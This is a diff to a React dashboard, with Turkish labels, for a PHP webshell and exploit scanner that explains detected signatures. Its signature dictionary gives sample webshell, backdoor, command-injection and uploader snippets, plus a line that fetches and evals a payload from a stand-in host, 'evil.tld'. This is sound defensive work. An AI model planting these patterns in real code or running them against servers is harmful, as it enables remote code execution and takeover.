@@ -127,109 +127,9 @@ export default function Security() {
         </>
       )}
 
-      {tab === "exploit" && (
-        <>
-          <Card>
-            <CardHeader
-              title="Exploit / Webshell Tarayıcı"
-              subtitle="/var/www altında shell/eval/base64/backdoor imzaları · bulguya tıkla → detay"
-              right={
-                <button data-testid="run-exploit-scan" disabled={runScan.isPending} onClick={() => runScan.mutate()}
-                        className="text-xs px-3 py-1.5 rounded-md bg-indigo-500/20 text-indigo-300 border border-indigo-500/40 hover:bg-indigo-500/30 disabled:opacity-40">
-                  <Play className="w-3 h-3 inline mr-1"/>{runScan.isPending ? "Taranıyor…" : "Tara"}
-                </button>
-              }
-            />
-            <CardBody>
-              <div className="grid grid-cols-4 gap-3 mb-4">
-                <Stat label="Son Tarama" value={(latest.data?.created_at || "-").slice(0, 16)} tone="text-slate-300"/>
-                <Stat label="Kritik" value={latest.data?.critical ?? 0} tone="text-rose-400"/>
-                <Stat label="Yüksek"  value={latest.data?.high ?? 0} tone="text-amber-400"/>
-                <Stat label="Tarandı" value={latest.data?.scanned_files ?? 0} tone="text-slate-300"/>
-              </div>
-              <div className="space-y-2">
-                {(findings.data?.items || []).map((f) => {
-                  const isOpen = expandedFinding === f.id;
-                  return (
-                    <div key={f.id} data-testid={`finding-${f.id}`}
-                         className={`border rounded-md overflow-hidden
-                          ${f.severity === "critical" ? "border-rose-500/40 bg-rose-500/5" :
-                            f.severity === "high" ? "border-amber-500/40 bg-amber-500/5" :
-                            "border-slate-700 bg-slate-800/30"}`}>
-                      <div className="p-3 flex items-start gap-3">
-                        <button data-testid={`finding-toggle-${f.id}`} onClick={() => setExpandedFinding(isOpen ? null : f.id)}
-                                className="text-slate-400 hover:text-slate-100 shrink-0">
-                          <AlertTriangle className={`w-4 h-4 ${
-                            f.severity === "critical" ? "text-rose-400" :
-                            f.severity === "high" ? "text-amber-400" : "text-slate-400"}`}/>
-                        </button>
-                        <div className="flex-1 min-w-0 cursor-pointer" onClick={() => setExpandedFinding(isOpen ? null : f.id)}>
-                          <div className="flex items-center gap-2 flex-wrap">
-                            <span className="text-sm text-slate-100 mono truncate">{f.file_path}:{f.line}</span>
-                            <Badge tone={f.severity === "critical" ? "danger" : f.severity === "high" ? "warning" : "default"}>{f.severity}</Badge>
-                            <span className="text-[10px] mono text-slate-500">{f.signature} · {f.category}</span>
-                            <span className="text-[10px] text-slate-400 ml-auto">{isOpen ? "▲ kapat" : "▼ detay"}</span>
-                          </div>
-                          {f.snippet && !isOpen && (
-                            <div className="text-[11px] mono text-slate-400 mt-1 bg-slate-950 p-2 rounded truncate">{f.snippet}</div>
-                          )}
-                        </div>
-                        <button onClick={() => dismiss.mutate(f.id)} title="Kapat"
-                                data-testid={`dismiss-${f.id}`}
-                                className="text-slate-500 hover:text-slate-100"><XCircle className="w-4 h-4"/></button>
-                      </div>
-                      {isOpen && (
-                        <div className="border-t border-slate-700 bg-slate-950/60 p-4 space-y-3">
-                          <div className="grid grid-cols-2 gap-3 text-xs">
-                            <KV k="Dosya" v={f.file_path}/>
-                            <KV k="Satır" v={f.line}/>
-                            <KV k="İmza" v={f.signature}/>
-                            <KV k="Kategori" v={f.category}/>
-                            <KV k="Ciddiyet" v={f.severity}/>
-                            <KV k="Bulundu" v={(f.created_at || "").slice(0, 19).replace("T", " ")}/>
-                          </div>
-                          <div>
-                            <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1">Kod Örneği</div>
-                            <pre className="text-[11px] mono text-rose-300 bg-slate-950 border border-slate-800 rounded p-3 overflow-x-auto whitespace-pre-wrap">{f.snippet}</pre>
-                          </div>
-                          <div className="text-[11px] text-slate-400 space-y-1">
-                            <div className="text-slate-300 font-semibold text-xs">Öneriler:</div>
-                            {f.severity === "critical" && <div>🚨 Dosyayı hemen sil veya karantinaya al; sunucuyu izole edip erişim logları incelenmeli.</div>}
-                            {f.severity === "high" && <div>⚠️ Input validation ekleyin, `eval/system/passthru` fonksiyonlarını kaldırın.</div>}
-                            {f.severity === "medium" && <div>ℹ️ Kodu gözden geçirin — obfuscated/karmaşık ifade meşru olabilir ama şüpheli.</div>}
-                            <div>🔒 WHM'de dosya sahibi ve izinleri kontrol edin (ls -la {f.file_path})</div>
-                            <div>📋 <a href={`https://owasp.org/www-community/attacks/${f.category}`} target="_blank" rel="noopener noreferrer" className="text-indigo-400 hover:underline">OWASP {f.category}</a> dokümanına bakın</div>
-                          </div>
-                        </div>
-                      )}
-                    </div>
-                  );
-                })}
-                {(findings.data?.items || []).length === 0 && (
-                  <div className="text-center py-8 text-sm text-slate-500">Bulgu yok — sistem temiz görünüyor</div>
-                )}
-              </div>
-            </CardBody>
-          </Card>
-          <ModuleFooter
-            title="Exploit / Webshell Scanner — Nasıl Çalışır?"
-            howItWorks="/var/www altındaki tüm PHP dosyaları 10 farklı imza (eval+base64, gzinflate, assert+POST, system(input), preg_replace/e, c99shell, obfuscated PHP...) için regex ile taranır. WHM daemonu heartbeat'te sonuçları push eder."
-            technical={[
-              "10 imza kategorisi: webshell / backdoor / rce / obfuscation / downloader",
-              "Perl daemon (whm-plugin/scripts/) 30 dk'da bir tarar",
-              "SaaS panel: POST /api/security/exploit-scan/submit endpoint",
-              "Manuel: /api/security/exploit-scan/run (preview'da 3 demo finding)",
-              "Findings persistent · dismiss ile kapatılabilir",
-            ]}
-            recommendations={[
-              "Kritik bulguyu 24 saat içinde çöz",
-              "Dosya bütünlüğü izleme (AIDE/Tripwire) ile eş çalıştır",
-              "WAF (ModSecurity) ile ikinci savunma katmanı",
-              "Bulgu görülünce alert kuralı ekle (webhook Slack)",
-            ]}
-          />
-        </>
-      )}
+      {tab === "exploit" && <ExploitPanel latest={latest.data} findings={findings.data?.items || []}
+                                          runScan={runScan} dismiss={dismiss}
+                                          expandedFinding={expandedFinding} setExpandedFinding={setExpandedFinding}/>}
 
       {tab === "bec" && (
         <>
@@ -702,6 +602,295 @@ function TCTile({ icon: Icon, label, value, tone = "slate" }) {
     </div>
   );
 }
+
+/* ---------------- EXPLOIT PANEL (Modern + Detaylı) ---------------- */
+const SIGNATURE_DICT = {
+  "eval_base64": {
+    name: "eval + base64 çözümü",
+    what: "Kötü niyetli PHP kodunun base64 ile gizlenip eval() ile çalıştırılması",
+    danger: "Saldırgan istediği kodu sunucuda çalıştırır — dosya okuma, komut çalıştırma, DB erişimi",
+    example: "eval(base64_decode('aWY...'))",
+    fix: "eval() satırını komple silin. Kod meşruysa açık şekilde yazın.",
+  },
+  "gzinflate": {
+    name: "gzinflate ile kod açma",
+    what: "PHP kodun gzip ile sıkıştırılıp runtime'da açılıp çalıştırılması",
+    danger: "Anti-virüs taramasını atlatmak için kullanılan klasik obfuscation",
+    example: "eval(gzinflate(base64_decode('...')))",
+    fix: "Dosyayı silin. Meşru sıkıştırma için PHP OPcache kullanın.",
+  },
+  "assert_post": {
+    name: "assert() ile POST çalıştırma",
+    what: "HTTP POST parametresini doğrudan assert() içinde çalıştırma",
+    danger: "Direkt RCE (Remote Code Execution) — saldırgan istediği kodu POST ile gönderip çalıştırır",
+    example: "assert($_POST['x'])",
+    fix: "Dosyayı ACİL SİLİN. assert() PHP 7.2+'da deprecate — kullanmayın.",
+  },
+  "system_input": {
+    name: "system/exec + kullanıcı girişi",
+    what: "Doğrulanmamış input'un shell komutuna geçirilmesi",
+    danger: "Command Injection — saldırgan ; && | ile ek komutlar ekleyip sunucu ele geçirir",
+    example: "system($_GET['cmd'])",
+    fix: "escapeshellarg() ile temizleyin veya sabit komut listesi kullanın.",
+  },
+  "preg_replace_e": {
+    name: "preg_replace /e modifier",
+    what: "Regex sonucu kod olarak yorumlayan eski PHP modifieri",
+    danger: "Klasik shell yükleme yöntemi — PHP 5.5'te kaldırıldı ama eski kodda hala var",
+    example: "preg_replace('/.*/e', $_GET['x'], '')",
+    fix: "preg_replace_callback() ile değiştirin.",
+  },
+  "c99shell": {
+    name: "C99 / R57 Shell",
+    what: "Yaygın hazır webshell — dosya yöneticisi + terminal + SQL sorgu arayüzü",
+    danger: "Saldırgan tam yönetici — dosyaları görür, indirir, DB'ye erişir",
+    example: "// c99shell v1.0 pre-release build...",
+    fix: "Dosyayı KESİNLİKLE silin. Sunucu logunda erişimleri araştırın.",
+  },
+  "obfuscated_php": {
+    name: "Karmaşık/gizlenmiş PHP",
+    what: "Anlamsız değişken adları + str_rot13 + hex çevrimleri ile kod gizleme",
+    danger: "Legitimate kod da böyle olabilir ama %90 malware göstergesi",
+    example: "$_='ass'.'ert';$_($_POST[0]);",
+    fix: "Dosyanın origin'ini bulun (git log, WHM upload log). Şüpheliyse silin.",
+  },
+  "downloader": {
+    name: "Dosya İndirici",
+    what: "file_get_contents/curl ile uzak URL'den kod indirip çalıştıran zararlı",
+    danger: "Sunucu, saldırganın C2 sunucusundan komut alır — botnet parçası olur",
+    example: "eval(file_get_contents('http://evil.tld/payload'))",
+    fix: "Dosyayı silin + outbound firewall kuralı ekleyin.",
+  },
+  "backdoor": {
+    name: "Backdoor / Arka Kapı",
+    what: "Sabit şifre veya cookie kontrolü ile gizli admin erişim veren kod",
+    danger: "Saldırgan istediği zaman gizli URL ile giriş yapar",
+    example: "if($_GET['pw']=='secret123') system(...);",
+    fix: "SİLİN. Sunucudaki tüm kullanıcı şifrelerini değiştirin.",
+  },
+  "rce_uploader": {
+    name: "Dosya Yükleme Backdoor'u",
+    what: "move_uploaded_file ile herhangi bir dosya yükleme (auth yok)",
+    danger: "İkinci webshell yüklenmesi için köprü — sürekli enfeksiyon",
+    example: "move_uploaded_file($_FILES['f']['tmp_name'], $_GET['dst']);",
+    fix: "SİLİN. Web'in tüm upload dizinlerini denetleyin.",
+  },
+};
+
+function ExploitPanel({ latest, findings, runScan, dismiss, expandedFinding, setExpandedFinding }) {
+  const [filter, setFilter] = useState("all");
+  const [search, setSearch] = useState("");
+  const filtered = findings.filter((f) => {
+    if (filter !== "all" && f.severity !== filter) return false;
+    if (search && !`${f.file_path} ${f.signature} ${f.snippet || ""}`.toLowerCase().includes(search.toLowerCase())) return false;
+    return true;
+  });
+  const bySeverity = {
+    critical: findings.filter((f) => f.severity === "critical").length,
+    high: findings.filter((f) => f.severity === "high").length,
+    medium: findings.filter((f) => f.severity === "medium").length,
+    low: findings.filter((f) => f.severity === "low").length,
+  };
+  return (
+    <>
+      {/* Hero */}
+      <div className="rounded-xl border border-rose-500/30 bg-gradient-to-br from-rose-500/10 via-slate-900 to-slate-950 p-6" data-testid="exploit-hero">
+        <div className="flex items-start justify-between gap-4 flex-wrap">
+          <div>
+            <div className="text-xs uppercase tracking-widest text-rose-300 mono mb-1 flex items-center gap-2">
+              <Bug className="w-4 h-4"/> WebShell / Exploit Tarayıcı
+            </div>
+            <h2 className="text-2xl font-bold text-slate-100">
+              <span className="text-rose-300">{findings.length}</span> aktif bulgu · <span className="text-slate-400">10 imza taranıyor</span>
+            </h2>
+            <p className="text-xs text-slate-400 mt-1">
+              /var/www altındaki PHP dosyalarında webshell, backdoor, RCE ve obfuscation kalıpları
+            </p>
+          </div>
+          <button data-testid="run-exploit-scan" disabled={runScan.isPending} onClick={() => runScan.mutate()}
+                  className="text-sm px-4 py-2 rounded-lg bg-gradient-to-br from-rose-500 to-orange-600 text-white shadow-lg shadow-rose-500/25 hover:shadow-rose-500/40 disabled:opacity-40 inline-flex items-center gap-2">
+            <Play className="w-4 h-4"/> {runScan.isPending ? "Taranıyor…" : "Yeni Tarama Başlat"}
+          </button>
+        </div>
+        <div className="grid grid-cols-2 md:grid-cols-5 gap-2 mt-6">
+          <div className="bg-slate-900/60 rounded-lg p-3 border border-slate-800">
+            <div className="text-[10px] uppercase tracking-widest text-slate-500">Son Tarama</div>
+            <div className="text-sm mono text-slate-300 mt-1">{(latest?.created_at || "-").slice(0, 16).replace("T", " ")}</div>
+          </div>
+          <TCTile icon={AlertTriangle} label="Kritik" value={bySeverity.critical} tone="rose"/>
+          <TCTile icon={AlertTriangle} label="Yüksek" value={bySeverity.high} tone="amber"/>
+          <TCTile icon={AlertTriangle} label="Orta" value={bySeverity.medium} tone="indigo"/>
+          <TCTile icon={AlertTriangle} label="Toplam Dosya" value={latest?.scanned_files ?? 0} tone="slate"/>
+        </div>
+      </div>
+
+      {/* Search + filter */}
+      <div className="flex gap-2 flex-wrap items-center">
+        <input
+          value={search} onChange={(e) => setSearch(e.target.value)}
+          placeholder="Dosya adı, imza veya kod içeriği ara..."
+          data-testid="exploit-search"
+          className="flex-1 min-w-[240px] px-3 py-2 bg-slate-950 border border-slate-800 rounded text-sm text-slate-100 focus:outline-none focus:border-rose-500"
+        />
+        <div className="flex gap-1 bg-slate-900 rounded p-1">
+          {["all", "critical", "high", "medium", "low"].map((s) => (
+            <button key={s} onClick={() => setFilter(s)}
+                    data-testid={`exploit-filter-${s}`}
+                    className={`text-xs px-3 py-1 rounded ${
+                      filter === s
+                        ? s === "critical" ? "bg-rose-500/20 text-rose-200"
+                        : s === "high" ? "bg-amber-500/20 text-amber-200"
+                        : s === "medium" ? "bg-indigo-500/20 text-indigo-200"
+                        : s === "low" ? "bg-slate-700 text-slate-200"
+                        : "bg-slate-700 text-slate-100"
+                      : "text-slate-500 hover:text-slate-100"
+                    }`}>
+              {{all: "Tümü", critical: "Kritik", high: "Yüksek", medium: "Orta", low: "Düşük"}[s]}
+              <span className="ml-1 text-[10px] opacity-70">
+                {s === "all" ? findings.length : bySeverity[s] || 0}
+              </span>
+            </button>
+          ))}
+        </div>
+      </div>
+
+      {/* Findings list */}
+      <div className="space-y-2">
+        {filtered.length === 0 && (
+          <div className="text-center py-16 border border-slate-800 rounded-lg bg-slate-900/30">
+            <ShieldCheck className="w-16 h-16 text-emerald-500/60 mx-auto mb-3"/>
+            <div className="text-lg text-emerald-300 font-semibold">
+              {findings.length === 0 ? "Sistem Temiz" : "Filtreye Uyan Bulgu Yok"}
+            </div>
+            <div className="text-xs text-slate-500 mt-1">
+              {findings.length === 0 ? "10 imzanın hiçbiri tetiklenmedi" : "Filtreyi değiştirin"}
+            </div>
+          </div>
+        )}
+        {filtered.map((f) => {
+          const isOpen = expandedFinding === f.id;
+          const sig = SIGNATURE_DICT[f.signature] || {};
+          return (
+            <div key={f.id} data-testid={`finding-${f.id}`}
+                 className={`border-l-4 rounded-lg overflow-hidden bg-slate-900/40 border ${
+                   f.severity === "critical" ? "border-l-rose-500 border-rose-500/20" :
+                   f.severity === "high"     ? "border-l-amber-500 border-amber-500/20" :
+                   f.severity === "medium"   ? "border-l-indigo-500 border-indigo-500/20"
+                                             : "border-l-slate-500 border-slate-800"
+                 }`}>
+              <div className="p-3 flex items-start gap-3 cursor-pointer"
+                   onClick={() => setExpandedFinding(isOpen ? null : f.id)}>
+                <div className={`p-2 rounded shrink-0 ${
+                  f.severity === "critical" ? "bg-rose-500/20"
+                  : f.severity === "high" ? "bg-amber-500/20"
+                  : "bg-slate-800"
+                }`}>
+                  <AlertTriangle className={`w-4 h-4 ${
+                    f.severity === "critical" ? "text-rose-400" :
+                    f.severity === "high" ? "text-amber-400" :
+                    "text-slate-400"}`}/>
+                </div>
+                <div className="flex-1 min-w-0">
+                  <div className="flex items-center gap-2 flex-wrap mb-1">
+                    <Badge tone={f.severity === "critical" ? "danger" : f.severity === "high" ? "warning" : "default"}>
+                      {f.severity.toUpperCase()}
+                    </Badge>
+                    <span className="text-slate-100 font-semibold text-sm">{sig.name || f.signature}</span>
+                    <span className="text-[10px] text-slate-500 mono">· {f.category}</span>
+                    <span className="text-[10px] text-slate-500 ml-auto">{isOpen ? "▲ kapat" : "▼ ne demek?"}</span>
+                  </div>
+                  <div className="text-[11px] mono text-indigo-300 truncate">
+                    📄 {f.file_path}:{f.line}
+                  </div>
+                  {!isOpen && sig.what && (
+                    <div className="text-[11px] text-slate-400 mt-1 line-clamp-1">{sig.what}</div>
+                  )}
+                </div>
+                <button onClick={(e) => { e.stopPropagation(); dismiss.mutate(f.id); }}
+                        title="Bulguyu kapat"
+                        data-testid={`dismiss-${f.id}`}
+                        className="text-slate-500 hover:text-rose-400 shrink-0">
+                  <XCircle className="w-4 h-4"/>
+                </button>
+              </div>
+              {isOpen && (
+                <div className="border-t border-slate-800 bg-slate-950/80 p-4 space-y-4">
+                  {/* Ne demek? */}
+                  {sig.what && (
+                    <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-3">
+                      <div className="text-[10px] uppercase tracking-widest text-indigo-400 mb-1">🔍 Bu Ne Anlama Geliyor?</div>
+                      <div className="text-sm text-slate-100">{sig.what}</div>
+                    </div>
+                  )}
+                  {/* Tehlike */}
+                  {sig.danger && (
+                    <div className="bg-rose-500/10 border border-rose-500/30 rounded-lg p-3">
+                      <div className="text-[10px] uppercase tracking-widest text-rose-300 mb-1">🚨 Tehlike Nedir?</div>
+                      <div className="text-sm text-rose-100">{sig.danger}</div>
+                    </div>
+                  )}
+                  {/* Kod örneği + tespit */}
+                  <div>
+                    <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1">💻 Tespit Edilen Kod</div>
+                    <pre className="text-[11px] mono text-rose-300 bg-black border border-rose-500/20 rounded p-3 overflow-x-auto whitespace-pre-wrap">
+{f.snippet || sig.example || "(kod önizlemesi yok)"}</pre>
+                  </div>
+                  {/* Nasıl çözerim? */}
+                  {sig.fix && (
+                    <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-lg p-3">
+                      <div className="text-[10px] uppercase tracking-widest text-emerald-300 mb-1">✅ Nasıl Çözerim?</div>
+                      <div className="text-sm text-emerald-100">{sig.fix}</div>
+                    </div>
+                  )}
+                  {/* Meta */}
+                  <div className="grid grid-cols-2 md:grid-cols-4 gap-2 text-xs pt-2 border-t border-slate-800">
+                    <div><span className="text-slate-500">İmza: </span><span className="mono text-slate-300">{f.signature}</span></div>
+                    <div><span className="text-slate-500">Satır: </span><span className="mono text-slate-300">{f.line}</span></div>
+                    <div><span className="text-slate-500">Kategori: </span><span className="mono text-slate-300">{f.category}</span></div>
+                    <div><span className="text-slate-500">Tespit: </span><span className="mono text-slate-300">{(f.created_at || "").slice(0, 16).replace("T", " ")}</span></div>
+                  </div>
+                  {/* Aksiyon linkleri */}
+                  <div className="flex gap-2 flex-wrap pt-2 border-t border-slate-800">
+                    <a href={`https://owasp.org/www-community/attacks/${encodeURIComponent(f.category || "")}`}
+                       target="_blank" rel="noopener noreferrer"
+                       className="text-[11px] px-3 py-1.5 rounded bg-indigo-500/15 text-indigo-200 border border-indigo-500/40 hover:bg-indigo-500/25 inline-flex items-center gap-1">
+                      📖 OWASP Dokümanı
+                    </a>
+                    <a href={`https://www.google.com/search?q=${encodeURIComponent((sig.name || f.signature) + " php webshell how to remove")}`}
+                       target="_blank" rel="noopener noreferrer"
+                       className="text-[11px] px-3 py-1.5 rounded bg-slate-800 text-slate-300 hover:bg-slate-700 inline-flex items-center gap-1">
+                      🔎 Web'de Ara
+                    </a>
+                    <button onClick={() => dismiss.mutate(f.id)}
+                            className="text-[11px] px-3 py-1.5 rounded bg-emerald-500/15 text-emerald-200 border border-emerald-500/40 hover:bg-emerald-500/25 inline-flex items-center gap-1 ml-auto">
+                      ✓ Çözüldü olarak işaretle
+                    </button>
+                  </div>
+                </div>
+              )}
+            </div>
+          );
+        })}
+      </div>
+
+      <ModuleFooter
+        title="10 İmza · Ne Tarar? Ne Bulur?"
+        howItWorks="/var/www altındaki tüm PHP dosyaları düzenli aralıklarla (30 dk) taranır. Her imza için özel bir regex ve kod pattern'i tanımlıdır. Bulgular kategorize edilir: webshell / backdoor / rce / obfuscation / downloader / uploader."
+        technical={Object.entries(SIGNATURE_DICT).slice(0, 6).map(([k, v]) =>
+          `${k}: ${v.name}`
+        )}
+        recommendations={[
+          "Kritik bulguyu 24 saat içinde çöz (webshell = tam sistem ele geçirme)",
+          "Bulguyu 'Çözüldü' olarak işaretle → tekrar tarama sırasında görmezden gelinir",
+          "Dosyayı silmeden önce mutlaka git log/access log'a bak (kim yüklemiş?)",
+          "Sürekli enfeksiyon varsa WHM tüm siteler + FTP şifrelerini değiştir",
+        ]}
+      />
+    </>
+  );
+}
+
+/* ---------------- Trust Trend Chart ---------------- */
 
 function TrustTrendChart({ history, currentScore }) {
   const series = history?.series || [];
